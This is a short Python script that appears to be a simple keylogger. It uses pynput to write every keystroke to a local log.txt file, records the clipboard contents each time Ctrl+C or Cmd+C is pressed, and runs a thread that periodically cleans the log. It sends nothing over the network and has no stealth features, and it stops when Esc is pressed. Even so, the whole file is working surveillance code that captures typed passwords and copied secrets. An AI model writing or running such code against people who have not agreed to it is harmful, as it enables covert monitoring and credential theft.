from pynput.keyboard import Key, Listener, KeyCode
import threading
import os
import time
import pyperclip

from text_cleaner import clean_log_content

pressed_keys = set()

def write_to_file(key):
    global pressed_keys

    pressed_keys.add(key)

    key_str = str(key).replace("'", "")
    key_str = key_str.replace("Key.space", " spacebar ")
    key_str = key_str.replace("Key.enter", " enterPressed\n")
    key_str = key_str.replace("Key.backspace", " backspaceKey ")
    key_str = key_str.replace("Key.shift", " shiftPressedKey ")
    key_str = key_str.replace("Key.ctrl", " ctrlKey+ ")
    key_str = key_str.replace("Key.cmd", " cmdKey ")
    key_str = key_str.replace("Key.tab", " tabKey ")
    key_str = key_str.replace("Key.right", " rightKey ")
    key_str = key_str.replace("Key.left", " leftKey ")
    key_str = key_str.replace("Key.up", " upKey ")
    key_str = key_str.replace("Key.down", " downKey ")

    if ((Key.ctrl in pressed_keys and key == KeyCode.from_char('c')) or
        (Key.cmd in pressed_keys and key == KeyCode.from_char('c'))):
        time.sleep(0.1)
        try:
            clipboard_content = pyperclip.paste()
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write("\n[CLIPBOARD] " + clipboard_content + "\n")
        except Exception as e:
            print("Error reading clipboard:", e)

    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key_str)

    if key == Key.esc:
        return False

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def periodic_cleaner():
    while True:
        if not os.path.exists(__file__):
            print("Script file deleted, stopping cleaner.")
            break

        with open("log.txt", "r", encoding="utf-8") as file:
            content = file.read()

        cleaned_content = clean_log_content(content)

        with open("log.txt", "w", encoding="utf-8") as file:
            file.write(cleaned_content)

        time.sleep(5)

listener = Listener(on_press=write_to_file, on_release=on_release)
listener.start()

cleaning_thread = threading.Thread(target=periodic_cleaner, daemon=True)
cleaning_thread.start()

listener.join()
